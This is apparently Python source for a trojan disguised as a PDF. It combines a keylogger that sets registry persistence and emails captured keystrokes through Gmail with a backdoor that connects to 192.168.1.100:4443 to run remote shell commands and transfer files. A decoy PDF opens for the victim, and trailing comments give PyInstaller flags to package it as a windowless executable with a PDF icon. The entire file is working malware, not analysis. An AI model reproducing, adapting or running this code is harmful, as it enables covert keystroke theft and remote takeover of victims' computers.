import pynput
import threading, smtplib, shutil, os, platform, sys, subprocess 
import socket
import json
import base64


class Keylogger:
    def __init__(self, time_interval, email, pw):
        self.become_persistent()
        self.log = "Keylogger started"
        self.time_interval = time_interval
        self.email = email
        self.pw = pw
        self.server = None
        #self.email_login(email, pw)

    def become_persistent(self):
        if platform.system() == "Windows":
            evil_file_location = os.environ["appdata"]+"\\Windows Explorerr.exe"
            if not os.path.exists(evil_file_location):
                shutil.copyfile(sys.executable, evil_file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"', shell=True)

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            print(key)
            if key == key.space:
                current_key = " "
            else:
                current_key =  " " + str(key) + " "

        self.log += current_key
        
    def email_login(self, email, pw):
        pass
        
    def send_mail(self, email, pw, message):       
        server = smtplib.SMTP("smtp.gmail.com",587) #google runs server on port 587
        server.starttls()
        server.login(email, pw)
        server.sendmail(email, email, message)

    def report(self):
        self.send_mail(self.email, self.pw, self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        try:
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
        except KeyboardInterrupt:
            print("server quitted")
            f = open("test.txt","a")
            f.write(e)
            f.close()
            self.server.quit()

class Backdoor:
	def __init__(self,ip,port):
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def reliable_send(self,data):
		json_data = json.dumps(data.decode())
		self.connection.send(json_data.encode())


	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode()
				return json.loads(json_data)
			except ValueError:
				continue


	def execute_system_commmand(self,command):
		
		command = ' '.join([str(elem) for elem in command])
		output = subprocess.check_output(command ,shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		output = str(output).encode("utf-8")
		return output


	def change_working_directory_to(self,path):
		os.chdir(path)
		return "[+] Change working directory to " + path

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Succesful"

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def run(self):
		while True:
			command = self.reliable_receive()
			try:
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1]).encode()
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1],command[2])
				else:
					command_result = self.execute_system_commmand(command)
			
			except Exception as e:
				print("err: ",e)
				command_result = "[-] Error during command Execution".encode()
			
			self.reliable_send(command_result)
filename = ".pdf\\"
if getattr(sys,'frozen', False ) :
    filename = sys._MEIPASS
    filename = os.path.join(filename, "BlackHatGo.pdf")
else:
    filename = os.path.dirname(__file__)
    filename = os.path.join(filename, "BlackHatGo.pdf")

filename = '/Users/kaancaglan/Desktop/BlackHatGo.pdf'
subprocess.Popen(filename, shell=True)

try:
    my_backdoor = Backdoor("192.168.1.100",4443)
    x  = threading.Thread(target=my_backdoor.run)
    x.start()
except Exception as e:
    print("Server is not listening! Error: ", e)

try:
    my_keylogger = Keylogger(3,"somemail@gmail.com","somepassword")
    y = threading.Thread(target=my_keylogger.start)
    y.start()
except Exception as e:
    print("Keylogger couldn't start. Error: ", e)


#C:\Users\user\AppData\Local\Programs\Python\Python37\Scripts\pyinstaller.exe 
#--noconsole 
#--onefile 
#--add-data "C:\Users\user\Desktop\malware\sample.pdf;." 
#--icon C:\Users\user\Downloads\pdf_icon.ico 
#.\some_pdf_2.py
